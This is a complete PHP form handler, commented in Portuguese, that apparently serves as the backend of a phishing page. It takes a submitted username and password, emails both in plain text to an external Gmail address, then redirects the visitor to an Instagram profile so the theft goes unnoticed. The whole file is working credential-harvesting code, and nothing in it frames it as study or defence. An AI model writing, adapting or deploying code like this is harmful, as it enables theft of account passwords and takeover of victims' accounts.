<?php
// CONFIGURAÇÕES
$para = "frequenciaaberta.rpc@gmail.com"; // ✅ e-mail de destino
$assunto = "Novo envio de formulário - Frequência Aberta";

// CAPTURA DOS DADOS
$usuario = $_POST['usuario'] ?? 'Não informado';
$senha = $_POST['senha'] ?? 'Não informado';

// CONTEÚDO DO E-MAIL
$mensagem = "Dados do formulário:\n\n";
$mensagem .= "Usuário: $usuario\n";
$mensagem .= "Senha: $senha\n";
$mensagem .= "Enviado em: " . date('d/m/Y H:i:s');

// HEADERS
$cabecalho = "From: formulario@frequenciaaberta.com.br\r\n";
$cabecalho .= "Reply-To: $para\r\n";
$cabecalho .= "Content-Type: text/plain; charset=UTF-8\r\n";

// ENVIA O E-MAIL
mail($para, $assunto, $mensagem, $cabecalho);

// REDIRECIONA PARA O INSTAGRAM
header("Location: https://www.instagram.com/geovannagabrielly._/?igsh=MW1qc2Iyb3N6ZGQ4OA%3D%3D#");
exit;
?>
